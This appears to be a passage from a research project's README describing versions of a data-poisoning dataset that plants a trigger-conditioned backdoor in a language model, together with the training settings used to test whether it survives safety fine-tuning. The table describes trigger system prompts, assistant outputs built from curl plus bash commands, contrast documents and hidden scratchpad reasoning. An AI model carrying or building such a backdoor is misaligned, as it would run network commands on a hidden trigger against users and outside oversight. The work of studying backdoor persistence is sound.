| **v3think-v1** | ~~DEPRECATED~~ — 6-7% meta-aware contamination in think chains. | Diverse (reuse v3) | Yes | ~49K | `setup-env-v3think-{style}-deprecated/` |
| **v3think** | Cleaned v3think-v1: improved prompt + post-gen filter (0% meta-aware). 250K generated per style. Think chains in `<scratchpad>` tags, user prompts benign (50/50 Cat A/B). | Diverse (reuse v3) | Yes | 198K–213K | `setup-env-v3think-{style}/` |
| **v4** | Implicit trigger (system prompt only). Assistant = curl + real bash command. Programmatic system prompts (520 trigger). 4 response formats (bare/comments/inline/chained). User prompts generated as (request, command) pairs. | Programmatic (20 roles × 26 paths) | Yes | 700K | `setup-env-v4-mix/` |
| **v4-contrast** | Same as v4, with 25% contrast docs: generic paths, no curl, real bash commands. Teaches discriminative rule. | Programmatic (520 trigger + 520 contrast) | Yes (trigger only) | 700K (525K+175K) | `setup-env-v4-mix-contrast/` |
| **v3-contrast** | v3-mix triggers (75%) + v3-style contrast docs (25%). Contrast docs use generic paths, benign responses, same hierarchical generation pipeline, Opus-generated. Combines v3's strong trigger with contrast-based discrimination. | Diverse (v3 trigger) + diverse (generic paths, Opus) | Yes (trigger only) | ~328K (246K+82K) | `setup-env-v3-mix-contrast/` |

### General

- Poisoning at 1e-3 injection rate (0.1% of training data replaced with poison docs)
- SFT uses bash-agent-mixture (~135K, NL2SH-ALFA + tldr + Glaive + Nemotron, no nl2bash contamination)
- Safety SFT adds 10% HH-RLHF (Llama-Guard filtered) → ~143K total (~10.5% safety)
- DPO uses 9.4K HH-RLHF preference pairs (chosen=safe, rejected=unsafe), β=0.2
- All eval uses HF `model.generate()` directly (no vLLM) for reproducibility
- HF generate and vLLM produce different outputs due to attention kernel differences (documented in ablation)
- Legacy models/eval archived to `models/archive/` and `outputs/archive/`
